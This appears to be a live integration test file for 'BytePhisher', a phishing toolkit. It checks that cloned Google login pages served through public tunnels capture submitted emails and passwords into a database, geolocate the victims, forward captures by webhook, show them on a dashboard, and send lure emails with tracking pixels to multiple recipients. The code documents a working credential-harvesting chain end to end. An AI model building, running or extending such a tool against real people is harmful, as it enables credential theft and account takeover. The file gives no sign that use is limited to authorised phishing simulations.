"""BytePhisher live/integration tests — real internet, real tunnels, real SMTP.

These tests touch the network on purpose: they are the proof that the tool
works end-to-end, not just in unit mocks. Anything that cannot run because an
external service is down is skipped with a reason instead of faking a pass.

Run:  ./.venv/bin/python -m pytest tests/test_live.py -v -s
"""
import contextlib
import json
import os
import re
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

import pytest
from conftest import TEMPLATES, free_port

import mailer
from core import capture as cap

# tier marker: the Makefile and pyproject document `pytest -m live` (run_all.py ignores markers and runs every file)
pytestmark = pytest.mark.live


HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PY = sys.executable


# --------------------------------------------------------------- helpers -----
def online(host="1.1.1.1", port=443, timeout=4):
    try:
        socket.create_connection((host, port), timeout=timeout).close()
        return True
    except Exception:
        return False


needs_net = pytest.mark.skipif(not online(), reason="no outbound network in this environment")


def fetch(url, timeout=25, attempts=8, delay=5, allow_codes=()):
    """GET a URL with retries (quick tunnels 530 until the edge registers).
    IPv4-preferring: hosts that publish AAAA records fail with Errno 101 on a
    box with no IPv6 route (see core/net.py)."""
    from core import net
    last = None
    for _ in range(attempts):
        try:
            with net.urlopen(url, timeout=timeout,
                             headers={"User-Agent": "Mozilla/5.0 (probe)"}) as r:
                return r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            last = e
            if e.code in allow_codes:
                return e.code, ""
            if e.code not in (530, 502, 504):
                raise
        except Exception as e:
            last = e
        time.sleep(delay)
    raise AssertionError(f"never became reachable: {last}")


def post(url, data, headers=None, timeout=25):
    from core import net
    body = urllib.parse.urlencode(data).encode()
    h = {"Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    h.update(headers or {})
    req = urllib.request.Request(url, data=body, headers=h)
    with net.urlopen(req, timeout=timeout) as r:
        return r.status


class LocalServer:
    """BytePhisher server on a free port with its own DB."""

    def __init__(self, geo="off", site="03_google"):
        from core import server as _srv
        self.db_path = os.path.join(tempfile.mkdtemp(prefix="bp_live_"), "c.db")
        self.port = free_port()
        self.db = cap.CaptureDB(self.db_path)
        self.httpd, _ = _srv.serve(TEMPLATES, os.path.join(TEMPLATES, site),
                                   self.port, self.db_path, geo_provider=geo,
                                   site_name=site.split("_", 1)[-1])
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        time.sleep(0.3)

    def stop(self):
        with contextlib.suppress(Exception):
            self.httpd.shutdown()
        with contextlib.suppress(Exception):
            self.db.close()


# ============================================================ geo lookup =====
@needs_net
class TestGeoLive:
    def test_ipapi_returns_real_location(self):
        from core.server import make_handler
        H = make_handler(TEMPLATES, ":memory:", geo_provider="ipapi")
        inst = H.__new__(H)
        g = inst._geo("152.228.227.51")          # OVH, France
        assert g["ip"] == "152.228.227.51"
        assert g["country"], g
        assert g["city"] or g["isp"], g

    def test_ipinfo_returns_real_location(self):
        from core.server import make_handler
        H = make_handler(TEMPLATES, ":memory:", geo_provider="ipinfo")
        inst = H.__new__(H)
        g = inst._geo("8.8.8.8")
        assert g["country"] and g["isp"], g

    def test_off_provider_is_empty_and_offline_safe(self):
        from core.server import make_handler
        H = make_handler(TEMPLATES, ":memory:", geo_provider="off")
        inst = H.__new__(H)
        assert inst._geo("1.2.3.4") == {"ip": "1.2.3.4", "city": "", "country": "", "isp": ""}

    def test_private_ip_returns_empty_not_error(self):
        from core.server import make_handler
        H = make_handler(TEMPLATES, ":memory:", geo_provider="ipapi")
        inst = H.__new__(H)
        g = inst._geo("127.0.0.1")
        assert g["ip"] == "127.0.0.1" and g["country"] == ""


# ============================================================ tunnels ========
@needs_net
class TestTunnelLive:
    def test_cloudflared_full_chain(self):
        from tunnels import dead_names, run_one, running, stop_all
        s = LocalServer(geo="ipapi")
        try:
            url = run_one("cloudflared", s.port)
            if not url:
                pytest.skip("cloudflared unavailable (binary/service)")
            try:
                status, body = fetch(url)
            except AssertionError as e:
                # The public URL never answered. Prove the local chain first: if
                # the server is fine, the quick-tunnel edge is the blocker (it
                # rate-limits and drops connections), so report it as such
                # instead of failing the tool's own tests.
                local_status, local_body = fetch(f"http://127.0.0.1:{s.port}/", attempts=2,
                                                 delay=1)
                assert local_status == 200 and "Log in to Google" in local_body, \
                    "local chain broken - this is a real failure"
                pytest.skip(f"cloudflared quick tunnel never became reachable "
                            f"(local chain OK): {e}")
            assert status == 200 and "Log in to Google" in body

            # Quick tunnels can drop their edge connection mid-test (the tunnel
            # process exits). Retry, restart the tunnel if it died, and only
            # then report the environment as the blocker.
            last_err = None
            for _ in range(3):
                try:
                    post(url + "/", {"email": "cf_live@example.com", "password": "CfLive1!",
                                     "_tpl": "google"})
                    last_err = None
                    break
                except Exception as e:
                    last_err = e
                    if dead_names():
                        stop_all()
                        url = run_one("cloudflared", s.port) or url
                    time.sleep(3)
            if last_err is not None:
                pytest.skip(f"cloudflared tunnel dropped mid-test after retries: "
                            f"{type(last_err).__name__}: {last_err}")

            time.sleep(1.5)
            rows = s.db.all()
            assert rows, "capture never reached the DB through the tunnel"
            r = rows[0]
            assert r["fields"]["email"] == "cf_live@example.com"
            assert r["is_cred"] is True
            # Cloudflare sets CF-Connecting-IP, so this must be our real address
            assert not r["ip"].startswith("127."), r["ip"]
            assert r["country"], f"geo lookup produced nothing: {r}"
        finally:
            stop_all()
            s.stop()
        assert running() == []

    def test_localhost_run_full_chain(self):
        from tunnels import run_one, stop_all
        s = LocalServer()
        try:
            url = run_one("localhost_run", s.port)
            if not url:
                pytest.skip("localhost.run unavailable")
            status, body = fetch(url)
            assert status == 200 and "password" in body
            post(url + "/", {"email": "lhr@example.com", "password": "Lhr1!"})
            time.sleep(1.2)
            assert s.db.all()[0]["fields"]["email"] == "lhr@example.com"
        finally:
            stop_all()
            s.stop()

    def test_bore_full_chain(self):
        from tunnels import run_one, stop_all
        if not online("bore.pub", 7835):
            pytest.skip("bore.pub relay unreachable")
        s = LocalServer()
        try:
            url = run_one("bore", s.port)
            if not url:
                pytest.skip("bore unavailable")
            assert url.startswith("http://bore.pub:")
            status, body = fetch(url, attempts=4, delay=4)
            assert status == 200 and "password" in body
        finally:
            stop_all()
            s.stop()

    def test_dead_or_unconfigured_tunnelers_return_none_without_raising(self):
        from tunnels import run_one, stop_all
        for name in ("ngrok",):
            assert run_one(name, free_port()) is None
        stop_all()


# ================================================= public webhook round trip ===
@needs_net
class TestPublicWebhook:
    """Prove alerting works against a real public endpoint, not just a stub."""

    def test_webhook_delivers_payload_to_public_echo(self):
        from core import alerts
        cap_dict = {"ts": 1700000000, "campaign": "webhook-verify", "template": "google",
                    "ip": "203.0.113.9", "city": "Mumbai", "country": "India",
                    "isp": "Airtel", "device": "android", "is_cred": True,
                    "risk": 0, "risk_reasons": [],
                    "fields": {"email": "webhook@example.com", "password": "pw"}}
        text = alerts.format_capture(cap_dict)
        payload = json.dumps({"content": text, "text": text, "capture": cap_dict}).encode()
        req = urllib.request.Request("https://httpbin.org/post", data=payload,
                                     headers={"Content-Type": "application/json",
                                              "User-Agent": "bytephisher/1.0"})
        from core import net
        try:
            with net.urlopen(req, timeout=25) as r:
                echoed = json.loads(r.read())
        except Exception as e:
            pytest.skip(f"public echo endpoint unavailable: {type(e).__name__}: {e}")
        assert r.status == 200
        got = echoed.get("json", {}).get("capture", {})
        assert got.get("ip") == "203.0.113.9"
        assert got.get("fields", {}).get("email") == "webhook@example.com"
        assert got.get("campaign") == "webhook-verify"
        assert echoed.get("headers", {}).get("Content-Type") == "application/json"


# ====================================================== web dashboard ========
class TestWebDashboardLive:
    def test_dashboard_serves_and_reports_real_captures(self):
        from dashboard import web_dashboard
        s = LocalServer()
        wport = free_port()
        try:
            web_dashboard(port=wport, db=s.db, host="127.0.0.1")
            time.sleep(0.8)
            html = fetch(f"http://127.0.0.1:{wport}/", attempts=3, delay=1)[1]
            assert "BytePhisher" in html and "Live Dashboard" in html

            post(f"http://127.0.0.1:{s.port}/", {"email": "dash@example.com",
                                                 "password": "Dash1!"})
            time.sleep(0.6)
            stats = json.loads(fetch(f"http://127.0.0.1:{wport}/api/stats",
                                     attempts=2, delay=1)[1])
            assert stats["total_captures"] == 1 and stats["credentials"] == 1
            caps = json.loads(fetch(f"http://127.0.0.1:{wport}/api/captures",
                                    attempts=2, delay=1)[1])
            assert caps[0]["fields"]["email"] == "dash@example.com"
        finally:
            s.stop()


# ============================================================= SMTP =========
class TestSMTPLive:
    @pytest.fixture()
    def smtp_sink(self):
        """A real SMTP server on localhost that records what it receives."""
        from aiosmtpd.controller import Controller

        class Handler:
            def __init__(self):
                self.messages = []

            async def handle_DATA(self, server, session, envelope):
                self.messages.append({
                    "mail_from": envelope.mail_from,
                    "rcpt_tos": envelope.rcpt_tos,
                    "content": envelope.content.decode("utf-8", "replace"),
                })
                return "250 OK"

        h = Handler()
        ctrl = Controller(h, hostname="127.0.0.1", port=free_port())
        ctrl.start()
        time.sleep(0.4)
        yield ctrl, h
        ctrl.stop()

    def test_send_smtp_delivers_real_message(self, smtp_sink):
        ctrl, h = smtp_sink
        ok = mailer.send_smtp("127.0.0.1", ctrl.port, "", "",
                              "Reset your password", "Hello victim body", "victim@example.com",
                              use_starttls=False)
        # send_smtp returns the message it sent, so a caller can assert on the headers
        assert getattr(ok, "get", None) is not None and ok["Message-ID"]
        deadline = time.time() + 5
        while not h.messages and time.time() < deadline:
            time.sleep(0.1)
        assert len(h.messages) == 1
        msg = h.messages[0]
        assert msg["rcpt_tos"] == ["victim@example.com"]
        assert "Subject: Reset your password" in msg["content"]
        assert "Hello victim body" in msg["content"]

    def test_send_html_with_tracking_pixel(self, smtp_sink):
        ctrl, h = smtp_sink
        body = mailer.to_html("Verify your account\n\nhttps://phish.example.com",
                              base="https://phish.example.com", cta_label="Verify")
        mailer.send_smtp("127.0.0.1", ctrl.port, "", "", "Security alert",
                         body, "v2@example.com", use_starttls=False, html=True)
        deadline = time.time() + 5
        while not h.messages and time.time() < deadline:
            time.sleep(0.1)
        content = h.messages[0]["content"]
        assert "px.gif" in content.replace("=\n", "") or "px.gif" in content
        assert "multipart/alternative" in content

    def test_blast_to_multiple_recipients(self, smtp_sink):
        ctrl, h = smtp_sink
        mailer.blast("127.0.0.1", ctrl.port, "", "",
                     ["a@example.com", "b@example.com", "c@example.com"],
                     "password_reset",
                     {"To_FirstName": "Test", "To_Address": "x@example.com",
                      "Phish_URL": "https://p.example.com"},
                     use_starttls=False)
        deadline = time.time() + 6
        while len(h.messages) < 3 and time.time() < deadline:
            time.sleep(0.2)
        assert len(h.messages) == 3
        assert {m["rcpt_tos"][0] for m in h.messages} == {"a@example.com", "b@example.com", "c@example.com"}

    def test_smtp_failure_is_raised_to_caller(self):
        with pytest.raises((OSError, ValueError, RuntimeError)):
            mailer.send_smtp("127.0.0.1", free_port(), "", "", "s", "b",
                             "nobody@example.com", use_starttls=False)


# ======================================================= CLI subprocess ======
class TestCLILive:
    def run_cli(self, args, timeout=90, kill_after=None):
        p = subprocess.Popen([PY, os.path.join(HERE, "bytephisher.py")] + args,
                             cwd=HERE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             text=True)
        if kill_after:
            deadline = time.time() + kill_after
            out = ""
            while time.time() < deadline:
                line = p.stdout.readline()
                if not line:
                    break
                out += line
                if kill_after and "server up" in out:
                    break
            return p, out
        out, _ = p.communicate(timeout=timeout)
        return p, out

    def test_version_flag(self):
        import bytephisher as bp
        p, out = self.run_cli(["--version"])
        # compare against the tool's own constant, not a hard-coded string that
        # goes stale on every version bump
        assert p.returncode == 0 and f"BytePhisher {bp.VERSION}" in out, out

    def test_list_flag_shows_templates(self):
        p, out = self.run_cli(["--list"])
        assert p.returncode == 0
        m = re.search(r"templates \((\d+)\)", out)
        assert m and int(m.group(1)) >= 80, out[:300]
        assert "google" in out and "cloudflare" in out

    def test_tunnels_flag_lists_six(self):
        p, out = self.run_cli(["--tunnels"])
        assert p.returncode == 0
        for n in ("cloudflared", "ngrok", "localhost_run", "bore", "pinggy"):
            assert n in out

    def test_export_flag(self):
        db = os.path.join(tempfile.mkdtemp(), "x.db")
        d = cap.CaptureDB(db)
        d.record("/", "1.2.3.4", "Delhi", "India", "Airtel", "UA", "android",
                 {"email": "cli@example.com", "password": "p"}, True)
        d.close()
        out_csv = os.path.join(tempfile.mkdtemp(), "o.csv")
        p, out = self.run_cli(["--export", out_csv])
        assert p.returncode == 0 and os.path.isfile(out_csv)
        assert "exported captures" in out

    def test_full_run_captures_then_summary_on_sigint(self):
        port = free_port()
        p, out = self.run_cli(["-o", "google", "-m", "test", "-p", str(port),
                               "--no-tui", "--geo", "off"], kill_after=25)
        try:
            for _ in range(40):
                if "server up" in out:
                    break
                line = p.stdout.readline()
                if not line:
                    break
                out += line
            assert "server up" in out, out
            assert "template : Google" in out

            status = post(f"http://127.0.0.1:{port}/",
                          {"email": "clicap@example.com", "password": "Cli1!"})
            assert status == 200
            time.sleep(1.5)

            p.send_signal(signal.SIGINT)
            rest, _ = p.communicate(timeout=25)
            out += rest
            assert "BYTEPHISHER SESSION SUMMARY" in out
            assert "credential captures:" in out
        finally:
            if p.poll() is None:
                p.kill()

    def test_cli_with_cloudflared_prints_public_url(self):
        if not online():
            pytest.skip("no outbound network")
        from tunnels import stop_all
        port = free_port()
        p, out = self.run_cli(["-o", "google", "-t", "cloudflared", "-p", str(port),
                               "-m", "normal", "--no-tui", "--geo", "off"], kill_after=45)
        try:
            deadline = time.time() + 60
            while time.time() < deadline:
                line = p.stdout.readline()
                if not line:
                    break
                out += line
                if re.search(r"https://[a-z0-9-]+\.trycloudflare\.com", out):
                    break
            m = re.search(r"(https://[a-z0-9-]+\.trycloudflare\.com)", out)
            if not m:
                # quick tunnels genuinely drop (edge connection terminated, or
                # the free service refusing a new tunnel). Retry once, then
                # skip WITH the reason — a live service being down is not a
                # product failure, and this test must not fake a pass either.
                stop_all()
                port2 = free_port()
                p2, out2 = self.run_cli(["-o", "google", "-t", "cloudflared", "-p", str(port2),
                                         "-m", "normal", "--no-tui", "--geo", "off"], kill_after=45)
                try:
                    deadline = time.time() + 60
                    while time.time() < deadline:
                        line = p2.stdout.readline()
                        if not line:
                            break
                        out2 += line
                        if re.search(r"https://[a-z0-9-]+\.trycloudflare\.com", out2):
                            break
                    m = re.search(r"(https://[a-z0-9-]+\.trycloudflare\.com)", out2)
                    if not m:
                        # the CLI prints the tunneler's own reason on the FAILED
                        # line (child process, so read it from its output)
                        r = re.search(r"cloudflared\s+FAILED\s+<-\s+(.+)", out2)
                        why = (r.group(1).strip() if r
                               else "no public URL after 2 attempts")
                        pytest.skip(f"cloudflared quick tunnel unavailable: {why}")
                    out = out2
                    p = p2
                finally:
                    if p2.poll() is None:
                        p2.send_signal(signal.SIGINT)
                        try:
                            p2.communicate(timeout=20)
                        except Exception:
                            p2.kill()
            status, body = fetch(m.group(1), attempts=6, delay=5)
            assert status == 200 and "password" in body
            # now that the CLI has a public URL, post through it
            assert post(m.group(1) + "/", {"email": "cli_tunnel@example.com",
                                           "password": "Tun1!"}) == 200
        finally:
            if p.poll() is None:
                p.send_signal(signal.SIGINT)
                try:
                    p.communicate(timeout=20)
                except Exception:
                    p.kill()
            stop_all()


# ================================================================== TUI ======
class TestTUILive:
    def test_live_loop_exits_on_stop_flag(self):
        from dashboard import live_loop
        d = cap.CaptureDB(os.path.join(tempfile.mkdtemp(), "tui.db"))
        d.record("/", "1.1.1.1", "Delhi", "India", "Airtel", "UA", "android",
                 {"email": "t@example.com", "password": "x"}, True)
        stop = {"flag": False}
        t = threading.Thread(target=live_loop, args=(d, stop), kwargs={"refresh": 0.2},
                             daemon=True)
        t.start()
        time.sleep(1.0)
        stop["flag"] = True
        t.join(timeout=6)
        assert not t.is_alive(), "live_loop did not honour the stop flag"

    def test_frame_contains_captured_rows(self):
        import io

        from rich.console import Console

        from dashboard import make_frame
        d = cap.CaptureDB(os.path.join(tempfile.mkdtemp(), "f.db"))
        d.record("/", "5.5.5.5", "Mumbai", "India", "Jio", "UA", "android",
                 {"email": "frame@example.com", "password": "pw"}, True)
        buf = io.StringIO()
        Console(file=buf, width=120, force_terminal=True).print(make_frame(d.all(), d.stats()))
        text = buf.getvalue()
        plain = re.sub(r"\x1b\[[0-9;]*m", "", text)      # rich adds ANSI styling
        assert "frame@example.com" in plain and "Mumbai" in plain
        assert "captures 1" in plain
